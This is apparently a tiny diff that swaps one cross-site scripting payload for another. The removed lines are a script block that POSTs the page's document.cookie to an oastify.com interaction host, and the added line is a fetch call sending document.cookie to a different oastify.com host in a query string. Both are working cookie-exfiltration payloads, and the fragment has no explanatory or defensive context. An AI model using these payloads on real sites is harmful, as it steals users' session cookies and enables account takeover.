@@ -1,7 +1,1 @@
-<script>
-  fetch('http://67bvfk9h7y69h8n2vokkx2syfplg9axz.oastify.com', {
-  method: 'POST',
-  mode: 'no-cors',
-  body: document.cookie
-  });
-</script>
+fetch('http://ng7co1iygffqqpwj45t16j1fo6uxis6h.oastify.com/?c=' + document.cookie)
